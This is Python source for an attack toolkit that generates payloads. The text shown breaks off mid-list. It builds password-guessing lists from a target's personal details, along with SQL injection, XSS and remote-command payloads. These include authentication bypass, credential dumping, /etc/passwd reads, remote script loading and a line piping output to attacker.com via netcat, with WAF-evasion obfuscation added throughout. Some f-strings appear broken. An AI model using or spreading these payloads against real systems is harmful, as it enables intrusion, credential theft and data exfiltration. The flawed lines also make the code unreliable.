import os
import sys
import json
import random
import itertools
import math
import re
import hashlib
import base64
import concurrent.futures
from datetime import datetime
from typing import List, Dict, Any, Tuple, Optional, Set
from prettytable import PrettyTable

class EnhancedPayloadGenerator:
    def __init__(self):
        """
        Enhanced Secure Payload Generation Framework
        Developed by Anubhav Mohandas
        Comprehensive Vulnerability Exploitation Toolkit
        """
        self.payload_types = [
            'password_bruteforce',
            'sql_injection',
            'xss',
            'rce',
            'ldap_injection',
            'command_injection',
            'deserialization',
            'xxe',
            'ssrf',
            'oauth_token_bypass',
            'path_traversal',
            'template_injection',
            'csrf_token_bypass',
            'jwt_tampering',
            'nosql_injection'
        ]
        
        self.payload_storage = {
            type: [] for type in self.payload_types
        }
        
        # Enhanced configuration and dictionaries
        self.config = {
            'max_payload_length': 2048,
            'entropy_threshold': 3.0,
            'mutation_rate': 0.5,
            'parallel_processing': True,
            'max_workers': 10,
            'obfuscation_level': 3,
            'fuzzing_iterations': 50,
            'evasion_techniques': True
        }
        
        # Enhanced dictionaries
        self.dictionaries = {
            'common_passwords': [],
            'tech_keywords': [],
            'company_names': [],
            'programming_languages': [],
            'special_chars': [],
            'database_keywords': [],
            'system_commands': [],
            'encoding_schemes': [],
            'domain_names': []
        }
        
        self.load_dictionaries()
        
        # Advanced logging
        self.log_file = f"payload_gen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.enable_logging = True
        
    def load_dictionaries(self):
        """
        Load comprehensive dictionaries for enhanced payload generation
        """
        dictionary_path = os.path.join(os.path.dirname(__file__), 'dictionaries')
        
        dictionary_files = {
            'common_passwords': 'passwords.txt',
            'tech_keywords': 'tech_keywords.txt',
            'company_names': 'companies.txt',
            'programming_languages': 'languages.txt',
            'special_chars': 'special_chars.txt',
            'database_keywords': 'db_keywords.txt',
            'system_commands': 'system_commands.txt',
            'encoding_schemes': 'encodings.txt',
            'domain_names': 'domains.txt'
        }
        
        for key, filename in dictionary_files.items():
            try:
                with open(os.path.join(dictionary_path, filename), 'r') as f:
                    self.dictionaries[key] = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                self.log(f"Dictionary {filename} not found. Using built-in list.")
                self.dictionaries[key] = self._generate_enhanced_dictionary(key)
    
    def _generate_enhanced_dictionary(self, dictionary_type):
        """
        Generate enhanced dictionary if file is not found
        """
        enhanced_dicts = {
            'common_passwords': [
                'password123', 'admin', 'welcome', 'password', '123456', 'qwerty', 
                'letmein', 'dragon', 'admin123', 'changeme', 'secret', 'abc123',
                'sunshine', 'princess', 'football', 'baseball', 'welcome1', 'master',
                'monkey', 'login', 'Admin@123', 'Password1', 'P@ssw0rd', 'qwerty123'
            ],
            'tech_keywords': [
                'database', 'server', 'cloud', 'network', 'security', 'authentication', 
                'encryption', 'firewall', 'vpn', 'kubernetes', 'docker', 'aws', 'azure',
                'devops', 'microservice', 'api', 'rest', 'graphql', 'jwt', 'oauth'
            ],
            'company_names': [
                'Google', 'Microsoft', 'Amazon', 'Apple', 'Facebook', 'Twitter', 
                'LinkedIn', 'Uber', 'Tesla', 'Netflix', 'Oracle', 'Salesforce',
                'Adobe', 'IBM', 'Intel', 'Cisco', 'Slack', 'Zoom', 'SpaceX'
            ],
            'programming_languages': [
                'python', 'java', 'javascript', 'c++', 'ruby', 'php', 'golang',
                'typescript', 'rust', 'swift', 'kotlin', 'scala', 'perl', 'bash',
                'powershell', 'c#', 'r', 'haskell', 'lua', 'groovy'
            ],
            'special_chars': [
                '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=',
                '{', '}', '[', ']', '|', '\\', ':', ';', '"', "'", '<', '>', ',', '.',
                '?', '/', '~', '`'
            ],
            'database_keywords': [
                'SELECT', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE',
                'ALTER', 'JOIN', 'UNION', 'ORDER BY', 'GROUP BY', 'HAVING', 'LIMIT',
                'EXEC', 'EXECUTE', 'DECLARE', 'CAST', 'CONVERT', 'VARCHAR', 'INT', 'sp_'
            ],
            'system_commands': [
                'ls', 'dir', 'cat', 'type', 'wget', 'curl', 'nc', 'netcat', 'python',
                'perl', 'bash', 'sh', 'cmd', 'powershell', 'ping', 'nslookup', 'dig',
                'whoami', 'id', 'hostname', 'ifconfig', 'ipconfig', 'netstat', 'ps'
            ],
            'encoding_schemes': [
                'base64', 'hex', 'url', 'html', 'unicode', 'octal', 'decimal', 'rot13'
            ],
            'domain_names': [
                'example.com', 'test.com', 'domain.com', 'company.org', 'site.net',
                'app.io', 'service.co', 'platform.dev', 'product.tech', 'tool.cloud'
            ]
        }
        return enhanced_dicts.get(dictionary_type, [])
    
    def log(self, message):
        """
        Log messages to file and console
        """
        if not self.enable_logging:
            return
            
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        
        try:
            with open(self.log_file, 'a') as f:
                f.write(log_entry + "\n")
        except Exception as e:
            print(f"Logging error: {e}")
    
    def _calculate_entropy(self, password: str) -> float:
        """
        Calculate password entropy for complexity assessment
        Enhanced with character class detection
        """
        if not password:
            return 0
            
        char_set = set(password)
        
        # Check for character classes to improve entropy calculation
        has_lowercase = bool(re.search(r'[a-z]', password))
        has_uppercase = bool(re.search(r'[A-Z]', password))
        has_digits = bool(re.search(r'[0-9]', password))
        has_special = bool(re.search(r'[^a-zA-Z0-9]', password))
        
        char_class_count = sum([has_lowercase, has_uppercase, has_digits, has_special])
        
        # Enhanced entropy calculation
        base_entropy = len(password) * math.log2(max(len(char_set), 1))
        class_bonus = char_class_count * 0.5
        
        return base_entropy + class_bonus
    
    def _obfuscate_payload(self, payload: str, technique: str = 'random') -> str:
        """
        Apply obfuscation techniques to payloads for evasion
        """
        if not payload:
            return payload
            
        techniques = ['hex', 'base64', 'url', 'comment', 'case', 'concat']
        
        if technique == 'random':
            technique = random.choice(techniques)
            
        if technique == 'hex':
            # Convert to hex
            return ''.join([f'\\x{ord(c):02x}' for c in payload])
        elif technique == 'base64':
            # Convert to base64
            return base64.b64encode(payload.encode()).decode()
        elif technique == 'url':
            # URL encoding
            return ''.join(['%{:02x}'.format(ord(c)) for c in payload])
        elif technique == 'comment':
            # Insert comments randomly
            chars = list(payload)
            comment_styles = ['/**/', '/*comment*/', '--', '#', '//']
            for _ in range(min(len(payload) // 3, 5)):
                pos = random.randint(0, len(chars)-1)
                chars.insert(pos, random.choice(comment_styles))
            return ''.join(chars)
        elif technique == 'case':
            # Random case modification
            return ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        elif technique == 'concat':
            # String concatenation
            if '+' in payload:
                parts = payload.split('+')
                return '+'.join([f"'{part}'" for part in parts if part])
            else:
                chars = list(payload)
                pos = random.randint(1, len(chars)-1)
                chars.insert(pos, "'+'" if "'" in payload else '"+')
                return ''.join(chars)
        
        return payload
    
    def _apply_evasion_techniques(self, payloads: List[str], context: str) -> List[str]:
        """
        Apply multiple evasion techniques for WAF/filter bypass
        """
        if not payloads:
            return []
            
        evaded_payloads = []
        obfuscation_level = self.config['obfuscation_level']
        
        for payload in payloads:
            # Apply original payload
            evaded_payloads.append(payload)
            
            # Apply basic obfuscation
            if obfuscation_level >= 1:
                evaded_payloads.append(self._obfuscate_payload(payload, 'case'))
                
            # Apply medium obfuscation
            if obfuscation_level >= 2:
                evaded_payloads.append(self._obfuscate_payload(payload, 'comment'))
                evaded_payloads.append(self._obfuscate_payload(payload, 'concat'))
                
            # Apply advanced obfuscation
            if obfuscation_level >= 3:
                # Combine multiple techniques
                temp = self._obfuscate_payload(payload, 'case')
                temp = self._obfuscate_payload(temp, 'comment')
                evaded_payloads.append(temp)
                
                # Context-specific evasion
                if context == 'sql':
                    # SQL specific evasion techniques
                    evaded_payloads.append(payload.replace(' ', '/**/')
                                        .replace('=', 'LIKE')
                                        .replace('UNION', 'UNI' + chr(10) + 'ON'))
                elif context == 'xss':
                    # XSS specific evasion techniques
                    evaded_payloads.append(payload.replace('<', '\\u003c')
                                        .replace('script', 'scr\\u0069pt')
                                        .replace('alert', 'al\\u0065rt'))
                elif context == 'rce':
                    # RCE specific evasion techniques
                    evaded_payloads.append(payload.replace(' ', '${IFS}')
                                        .replace(';', '\\;')
                                        .replace('|', '\\|'))
        
        return list(set(evaded_payloads))
    
    def _fuzz_payload(self, base_payload: str, iterations: int = 10) -> List[str]:
        """
        Apply fuzzing techniques to generate payload variants
        """
        if not base_payload:
            return []
            
        fuzzing_results = [base_payload]
        
        for _ in range(iterations):
            # Select a random fuzzing technique
            technique = random.choice(['prefix', 'suffix', 'duplicate', 'substitute', 'insert'])
            
            if technique == 'prefix':
                # Add random prefix
                prefix = random.choice(['/*!50000 ', '/**/)', '"\'', '\\', '//', '-- '])
                fuzzing_results.append(prefix + base_payload)
            elif technique == 'suffix':
                # Add random suffix
                suffix = random.choice([' --', ' #', ';//', '\x00', ';%00', '/**/'])
                fuzzing_results.append(base_payload + suffix)
            elif technique == 'duplicate':
                # Duplicate part of the payload
                if len(base_payload) > 3:
                    start = random.randint(0, len(base_payload)-3)
                    length = random.randint(1, min(5, len(base_payload)-start))
                    dup_part = base_payload[start:start+length]
                    fuzzing_results.append(base_payload[:start] + dup_part + dup_part + base_payload[start+length:])
            elif technique == 'substitute':
                # Substitute characters
                chars = list(base_payload)
                if chars:
                    pos = random.randint(0, len(chars)-1)
                    chars[pos] = random.choice(self.dictionaries['special_chars']) if self.dictionaries['special_chars'] else '*'
                    fuzzing_results.append(''.join(chars))
            elif technique == 'insert':
                # Insert random characters
                chars = list(base_payload)
                if chars:
                    pos = random.randint(0, len(chars))
                    chars.insert(pos, random.choice(self.dictionaries['special_chars']) if self.dictionaries['special_chars'] else '*')
                    fuzzing_results.append(''.join(chars))
        
        return list(set(fuzzing_results))
    
    def generate_enhanced_password_payloads(self, personal_info: Dict[str, Any] = None, advanced_mode: bool = True) -> List[str]:
        """
        Enhanced password payload generation with contextual and probabilistic mutations
        """
        self.log("Generating enhanced password payloads...")
        
        if personal_info is None:
            # Prompt user for personal information if not provided
            personal_info = {
                'first_name': input("Enter first name: "),
                'last_name': input("Enter last name: "),
                'birthdate': input("Enter birthdate (YYYYMMDD): "),
                'pet_name': input("Enter pet name: "),
                'company': input("Enter company name: "),
                'favorite_number': input("Enter favorite number: "),
                'favorite_color': input("Enter favorite color: ")
            }
        
        base_words = [
            personal_info.get('first_name', ''),
            personal_info.get('last_name', ''),
            personal_info.get('birthdate', ''),
            personal_info.get('pet_name', ''),
            personal_info.get('company', ''),
            personal_info.get('favorite_number', ''),
            personal_info.get('favorite_color', '')
        ]
        
        # Remove empty values and normalize
        base_words = [word.strip() for word in base_words if word.strip()]
        
        password_payloads = []
        
        # Enhanced Mutations
        for word in base_words:
            if not word:
                continue
            
            # Basic mutations
            mutations = [
                word,
                word.lower(),
                word.upper(),
                word.capitalize(),
                word + '!',
                word + '@',
                word + '#',
                word + '$',
                word + '123',
                word + '1234',
                word + '12345',
                word + '!@#',
                word + '123!',
                '123' + word,
                word + str(random.randint(1900, 2024))
            ]
            
            # Advanced mutations (for longer words)
            if len(word) > 3 and advanced_mode:
                # Leetspeak substitutions
                leetspeak = word.lower()
                leetspeak = leetspeak.replace('a', '4')
                leetspeak = leetspeak.replace('e', '3')
                leetspeak = leetspeak.replace('i', '1')
                leetspeak = leetspeak.replace('o', '0')
                leetspeak = leetspeak.replace('s', '5')
                leetspeak = leetspeak.replace('t', '7')
                mutations.append(leetspeak)
                
                # Reversed word
                mutations.append(word[::-1])
                
                # Capitalization patterns
                mutations.append(word[0].upper() + word[1:].lower())
                mutations.append(word[:-1].lower() + word[-1].upper())
                
                # Common patterns with word
                mutations.append(word + "!" + str(datetime.now().year))
                mutations.append(word + "@" + str(datetime.now().year))
            
            password_payloads.extend(mutations)
        
        # Enhanced Dictionary Enrichment
        password_payloads.extend(self.dictionaries['common_passwords'])
        
        # Advanced Contextual Combinations
        if advanced_mode:
            # Combinations of words with special characters and numbers
            for word1, word2 in itertools.combinations(base_words, 2):
                if not word1 or not word2:
                    continue
                
                combined_words = [
                    word1 + word2,
                    word2 + word1,
                    word1 + '_' + word2,
                    word1 + str(random.randint(1, 9999)),
                    word1 + str(datetime.now().year),
                    word1.capitalize() + word2 + "!",
                    word1 + "." + word2,
                    word1[0].upper() + word1[1:] + word2[0].upper() + word2[1:],
                    word1 + word2 + random.choice(["!", "@", "#", "$", "%"]) if self.dictionaries['special_chars'] else "!"
                ]
                
                password_payloads.extend(combined_words)
            
            # Combinations of three words for complex passwords
            for word1, word2, word3 in itertools.combinations(base_words, 3):
                if not word1 or not word2 or not word3:
                    continue
                
                if len(base_words) >= 3:  # Only if we have enough base words
                    triple_words = [
                        word1 + word2 + word3,
                        word1[0] + word2[0] + word3 + "123",
                        word1.capitalize() + word2[0].upper() + word3
                    ]
                    
                    password_payloads.extend(triple_words)
            
            # Add common patterns and variations
            current_year = datetime.now().year
            for word in base_words:
                if not word:
                    continue
                
                patterns = [
                    f"{word}@{current_year}",
                    f"{word.capitalize()}123!",
                    f"{word.capitalize()}@{str(current_year)[2:]}",
                    f"{word.lower()}{random.choice(['!', '@', '#', '$'])}123"
                ]
                
                password_payloads.extend(patterns)
        
        # Remove duplicates and apply enhanced entropy filter
        unique_payloads = list(set(password_payloads))
        filtered_payloads = [
            payload for payload in unique_payloads 
            if self._calculate_entropy(payload) >= self.config['entropy_threshold']
        ]
        
        # Apply parallel fuzzing if enabled
        if self.config['parallel_processing'] and advanced_mode:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['max_workers']) as executor:
                # Apply fuzzing to a subset of promising payloads
                promising_payloads = sorted(filtered_payloads, 
                                          key=self._calculate_entropy, 
                                          reverse=True)[:min(20, len(filtered_payloads))]
                
                fuzzing_results = list(executor.map(
                    lambda p: self._fuzz_payload(p, self.config['fuzzing_iterations'] // 5),
                    promising_payloads
                ))
                
                for result in fuzzing_results:
                    filtered_payloads.extend(result)
        
        # Sort by entropy (most complex first) and deduplicate
        sorted_payloads = sorted(list(set(filtered_payloads)), 
                               key=self._calculate_entropy, 
                               reverse=True)
        
        self.log(f"Generated {len(sorted_payloads)} password payloads")
        self.payload_storage['password_bruteforce'] = sorted_payloads
        
        return sorted_payloads
    
    def generate_enhanced_sql_injection(self, database_type: str = None, authentication_method: str = None) -> List[str]:
        """
        Enhanced SQL Injection Payload Generation with advanced techniques
        """
        self.log("Generating enhanced SQL injection payloads...")
        
        if database_type is None:
            database_type = input("Enter database type (e.g., MySQL, PostgreSQL, MSSQL, Oracle, SQLite): ")
        
        if authentication_method is None:
            authentication_method = input("Enter authentication context (e.g., login, search, parameter): ")
        
        # Generic SQL Injection vectors
        base_injections = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "' OR 1=1--",
            "admin' --",
            "admin'/*",
            "1' OR '1'='1' /* ",
            "' OR 1=1#",
            "\" OR \"\"=\"",
            "1 OR 1=1--",
            "1' OR 1=1 LIMIT 1;#",
            "' OR '1'='1' LIMIT 1;#",
            "1 UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL#",
            "' OR '' = '"
        ]
        
        # Database-specific payloads
        db_specific = {
            'mysql': [
                "1' UNION SELECT schema_name FROM information_schema.schemata--",
                "1' UNION SELECT table_name FROM information_schema.tables--",
                "1' AND (SELECT COUNT(*) FROM mysql.user) > 0--",
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "1' AND IF(1=1, SLEEP(2), 0)--",
                "1' PROCEDURE ANALYSE()--",
                "1' UNION SELECT LOAD_FILE('/etc/passwd')--",
                "1' INTO OUTFILE '/tmp/test.txt'--",
                "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "1' OR 1=1 ORDER BY 10--"
            ],
            'postgresql': [
                "1' UNION SELECT version()--",
                "1' UNION SELECT current_database()--",
                "1'; SELECT pg_sleep(5)--",
                "1'; SELECT current_setting('data_directory')--",
                "1'; CREATE TABLE cmd_exec(cmd_output text)--",
                "1'; COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt'--",
                "1'; DO $$ BEGIN PERFORM pg_sleep(5); END $$--",
                "1' AND (SELECT 'a' FROM pg_sleep(5))--",
                "1'; SELECT string_agg(datname, ',') FROM pg_database--",
                "1'; SELECT string_agg(tablename, ',') FROM pg_tables--"
            ],
            'mssql': [
                "1' UNION SELECT @@version--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "1'; EXEC xp_cmdshell 'dir'--",
                "1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--",
                "1' UNION SELECT name FROM sys.databases--",
                "1' UNION SELECT name FROM sys.tables--",
                "1'; BACKUP DATABASE master TO DISK='C:\\temp\\backup.bak'--",
                "1' AND 1=(SELECT COUNT(*) FROM sysusers WHERE name='sa')--",
                "1'; SELECT * FROM fn_helpcollations()--",
                "1'; SELECT * FROM INFORMATION_SCHEMA.TABLES--"
            ],
            'oracle': [
                "1' UNION SELECT banner FROM v$version--",
                "1' UNION SELECT table_name FROM all_tables--",
                "1' UNION SELECT username FROM all_users--",
                "1' AND 1=(SELECT COUNT(*) FROM all_users WHERE username='SYS')--",
                "1' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('google.com') FROM DUAL) IS NOT NULL--",
                "1' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)=1--",
                "1' UNION SELECT DBMS_METADATA.GET_DDL('TABLE','USERS') FROM DUAL--",
                "1' AND (SELECT SYS.DATABASE_NAME FROM DUAL) IS NOT NULL--",
                "1' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL--",
                "1' UNION SELECT owner,table_name FROM all_tables--"
            ],
            'sqlite': [
                "1' UNION SELECT sqlite_version()--",
                "1' UNION SELECT name FROM sqlite_master--",
                "1' UNION SELECT sql FROM sqlite_master--",
                "1' UNION SELECT group_concat(name) FROM pragma_table_info('users')--",
                "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
                "1' OR sqlite_version()--",
                "1' OR (SELECT count(*) FROM sqlite_master)--",
                "1' UNION SELECT 1,2,3,4,load_extension('/tmp/malicious.so','main')--",
                "1' OR 1=1 LIMIT 1 OFFSET 1--",
                "1' ATTACH DATABASE '/tmp/test.db' AS test--"
            ]
        }
        
        db_type_lower = database_type.lower()
        db_payloads = []
        
        # Add database-specific payloads
        for db_name, payloads in db_specific.items():
            if db_name in db_type_lower or db_type_lower == 'all':
                db_payloads.extend(payloads)
        
        # Add generic payloads if no specific database matched or 'all' was specified
        if not db_payloads or db_type_lower == 'all':
            db_payloads = list(set(base_injections + [payload for sublist in db_specific.values() for payload in sublist]))
        else:
            db_payloads = list(set(base_injections + db_payloads))
        
        # Advanced Blind SQL Injection Techniques
        blind_sql_payloads = [
            "1' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>5)=1--",
            "1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
            "1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>96--",
            "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        
        # Time-Based Blind SQL Injection
        time_based_payloads = [
            f"1' AND IF(LENGTH(DATABASE())>{random.randint(3, 8)}, SLEEP(2), 0)--",
            f"1' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>{random.randint(96, 110)}, SLEEP(2), 0)--",
            f"1' OR IF(ASCII(SUBSTRING((SELECT version()),1,1))=ASCII('5'), SLEEP(3), SLEEP(0))--",
            f"1'; SELECT CASE WHEN (username='admin') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--",
            f"1'; WAITFOR DELAY '00:00:03'--"
        ]
        
        # Error-Based SQL Injection
        error_based_payloads = [
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
            "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95,95,95),(SELECT version()),CHAR(95,95,95),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
            "1' AND (SELECT 3635 FROM(SELECT COUNT(*),CONCAT(0x7176786271,(SELECT (ELT(3635=3635,1))),0x7176786a71,FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)--",
            "1' AND JSON_ARRAYAGG(1 ORDER BY (SELECT GET_LOCK(CONCAT(USER(),' ',@@version),1)))--",
            "1' AND extractvalue(1, concat(0x7e, version(), 0x7e))--"
        ]
        
        # Union-Based SQL Injection (Advanced)
        union_based_payloads = [
            "1' UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
            "1' UNION ALL SELECT NULL,NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            "1' UNION ALL SELECT NULL,CONCAT(username,':',password),NULL,NULL FROM users--",
            "1' UNION ALL SELECT NULL,GROUP_CONCAT(username,':',password),NULL,NULL FROM users--",
            "1' UNION ALL SELECT NULL,load_file('/etc/passwd'),NULL,NULL--"
        ]
        
        # Authentication Bypass Specific
        auth_bypass_payloads = [
            "admin' --",
            "admin'/*",
            "admin' OR '1'='1",
            "admin' OR '1'='1'--",
            "admin' OR '1'='1'/*",
            "admin'OR 1=1--",
            "admin' OR 1=1#",
            "admin')OR('1'='1",
            "admin') OR ('1'='1'--",
            "1' OR '1'='1' LIMIT 1;#"
        ]
        
        # Combine all payload types based on authentication context
        all_payloads = db_payloads[:]
        
        if authentication_method.lower() in ['login', 'auth', 'authentication']:
            all_payloads.extend(auth_bypass_payloads)
        
        # Add advanced payloads for comprehensive testing
        all_payloads.extend(blind_sql_payloads)
        all_payloads.extend(time_based_payloads)
        all_payloads.extend(error_based_payloads)
        all_payloads.extend(union_based_payloads)
        
        # Apply evasion techniques
        evaded_payloads = self._apply_evasion_techniques(all_payloads, 'sql')
        
        self.log(f"Generated {len(evaded_payloads)} SQL injection payloads")
        self.payload_storage['sql_injection'] = evaded_payloads
        
        return evaded_payloads
    
    def generate_enhanced_xss_payloads(self, context: str = None) -> List[str]:
        """
        Enhanced Cross-Site Scripting (XSS) Payload Generation
        Supports various contexts with specialized payloads
        """
        self.log("Generating enhanced XSS payloads...")
        
        if context is None:
            context = input("Enter XSS context (e.g., html, attribute, js, url, dom): ")
        
        # Basic XSS vectors
        basic_xss = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "\"><script>alert('XSS')</script>",
            "'-alert('XSS')-'",
            "</script><script>alert('XSS')</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">"
        ]
        
        # Context-specific payloads
        context_payloads = {
            'html': [
                "<div onmouseover=\"alert('XSS')\">Hover me</div>",
                "<marquee onstart=\"alert('XSS')\">test</marquee>",
                "<svg><animate onbegin=\"alert('XSS')\" attributeName=\"x\"/></svg>",
                "<body onpageshow=\"alert('XSS')\">",
                "<video src=1 onerror=\"alert('XSS')\"></video>",
                "<audio src=1 onerror=\"alert('XSS')\"></audio>",
                "<details open ontoggle=\"alert('XSS')\">",
                "<select autofocus onfocus=\"alert('XSS')\">",
                "<input autofocus onfocus=\"alert('XSS')\">",
                "<keygen autofocus onfocus=\"alert('XSS')\">"
            ],
            'attribute': [
                "\" onmouseover=\"alert('XSS')\" \"",
                "\" onclick=\"alert('XSS')\" \"",
                "\" onfocus=\"alert('XSS')\" autofocus \"",
                "' onmouseover='alert(\"XSS\")' '",
                "' onclick='alert(\"XSS\")' '",
                "' onfocus='alert(\"XSS\")' autofocus '",
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "\"><img src=x onerror=\"alert('XSS')\">"
            ],
            'js': [
                "\'-alert('XSS')-\'",
                "\";alert('XSS');//",
                "\";alert('XSS')//",
                "\\\");alert('XSS');//",
                "\\'-alert('XSS')-\\''",
                "alert('XSS')",
                "prompt('XSS')",
                "confirm('XSS')",
                "alert(document.domain)",
                "(alert)('XSS')"
            ],
            'url': [
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "vbscript:alert('XSS')",
                "javascript:prompt('XSS')",
                "javascript:confirm('XSS')",
                "\"><s>000</s><script>alert('XSS')</script>",
                "java%0ascript:alert('XSS')",
                "javascript://%0aalert('XSS')",
                "&'><script>alert('XSS')</script>",
                "/redirect.php?url=javascript:alert('XSS')"
            ],
            'dom': [
                "<img src=x onerror=eval(location.hash.slice(1))>#alert('XSS')",
                "<iframe src=\"javascript:alert(document.domain)\"></iframe>",
                "<script>document.write('<img src=x onerror=alert(\"XSS\")>')</script>",
                "<script>eval(location.search.substr(1))</script>?alert('XSS')",
                "<script>document.body.innerHTML='<img src=x onerror=alert(\"XSS\")>'</script>",
                "<img src=a:b onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
                "<svg/onload=\"[].forEach.call(document.getElementsByTagName('*'),function(a){a.innerHTML='<img src=x onerror=alert(\"XSS\")>'})\">",
                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
                "<script>$.getScript('//example.com/xss.js')</script>",
                "<script>var script = document.createElement('script');script.src = '//example.com/xss.js';document.body.appendChild(script);</script>"
            ]
        }
        
        # Advanced XSS Payloads (DOM-based, filter bypasses, etc.)
        advanced_xss = [
            "<img src=x:x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))></img>",
            "<svg><animate onbegin=alert('XSS') attributeName=x></animate>",
            "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert('XSS')</x:script>",
            "<script>Object.defineProperties(window, {alert: {value: eval}});alert('alert(\"XSS\")')</script>",
            "<svg><set attributeName=href onbegin=alert('XSS')>",
            "<svg><animate attributeName=href values=javascript:alert('XSS') /><a xlink:href=#><circle r=100 /></a>",
            "<svg><a><animate attributeName=href values=javascript:alert('XSS') /><text x=20 y=20>Click Me</text></a>",
            "<math><a xlink:href=\"javascript:alert('XSS')\">click",
            "<script>({set/**/$($){_=$,eval($)}}).$='alert(\"XSS\")'</script>",
            "<script>(()=>{return this})().alert('XSS')</script>"
        ]
        
        # Filter/WAF Bypass XSS Payloads
        filter_bypass_xss = [
            "<script>$.globalEval('alert(\"XSS\")')</script>",
            "<script>setTimeout('alert(\"XSS\")',500)</script>",
            "<script>setInterval('alert(\"XSS\")',500)</script>",
            "<scr<script>ipt>alert('XSS')</script>",
            "<scr\x00ipt>alert('XSS')</script>",
            "<svg/onload=setTimeout//1//('alert(\"XSS\")');>",
            "<svg/onload=setInterval//1//('alert(\"XSS\")');>",
            "<script>({toString:function(){return 'alert(\"XSS\")'}}.toString())()</script>",
            "javascript:eval('\\u'+'0061'+'lert(\"XSS\")')",
            "<svg/onload=\"window[/alert/.source](XSS)\">"
        ]
        
        # Combine all payloads based on context
        all_payloads = basic_xss[:]
        
        context_lower = context.lower()
        if context_lower in context_payloads:
            all_payloads.extend(context_payloads[context_lower])
        elif context_lower == 'all':
            for ctx_payloads in context_payloads.values():
                all_payloads.extend(ctx_payloads)
        
        # Add advanced payloads for comprehensive testing
        all_payloads.extend(advanced_xss)
        all_payloads.extend(filter_bypass_xss)
        
        # Apply evasion techniques
        evaded_payloads = self._apply_evasion_techniques(all_payloads, 'xss')
        
        self.log(f"Generated {len(evaded_payloads)} XSS payloads")
        self.payload_storage['xss'] = evaded_payloads
        
        return evaded_payloads
    
    def generate_enhanced_rce_payloads(self, os_type: str = None, command: str = None) -> List[str]:
        """
        Enhanced Remote Code Execution (RCE) Payload Generation
        """
        self.log("Generating enhanced RCE payloads...")
        
        if os_type is None:
            os_type = input("Enter target OS type (e.g., linux, windows, all): ")
        
        if command is None:
            command = input("Enter base command (e.g., id, whoami, ls, dir): ")
        
        # Basic RCE vectors
        basic_rce = [
            f";{command}",
            f"&&{command}",
            f"||{command}",
            f"|{command}",
            f"`{command}`",
            f"$(command)",
            f"system('{command}')",
            f"shell_exec('{command}')",
            f"passthru('{command}')",
            f"exec('{command}')"
        ]
        
        # OS-specific payloads
        os_payloads = {
            'linux': [
                f"$(echo '{command}'|base64 -d)",
                f"`echo {command}|base64 -d`",
                f"$(which {command})",
                f";{command} 2>&1",
                f"$({{{command}}})",
                f";sh -c '{command}'",
                f"$(sh -c '{command}')",
                f"`sh -c '{command}'`",
                f"${{command}}",
                f"$$${{command}}$$$"
            ],
            'windows': [
                f"%0A{command}",
                f"!{command}!",
                f"^{command}",
                f"%COMSPEC% /c {command}",
                f"cmd.exe /c {command}",
                f"cmd /c {command}",
                f"cmd/c {command}",
                f"%0D%0A{command}",
                f"%0A%0D{command}",
                f"powershell -command \"{command}\""
            ]
        }
        
        # Advanced RCE techniques
        advanced_rce = [
            f"python -c 'import os; os.system(\"{command}\")'",
            f"perl -e 'system(\"{command}\")'",
            f"ruby -e 'system(\"{command}\")'",
            f"bash -c '{command}'",
            f"sh -c '{command}'",
            f"sleep 1 && {command}",
            f"timeout 1 {command}",
            f"nohup {command} &",
            f"eval('{command}')",
            f"{command} | nc attacker.com 4444"
        ]
        
        # Filter/WAF Bypass RCE
        filter_bypass_rce = [
            f"'$@{command}'",
            f"\"$@{command}\"",
            f"${{9999..10001}}",
            f"ca''t /etc/passwd",
            f"cat$IFS/etc/passwd",
            f"cat${IFS}/etc/passwd",
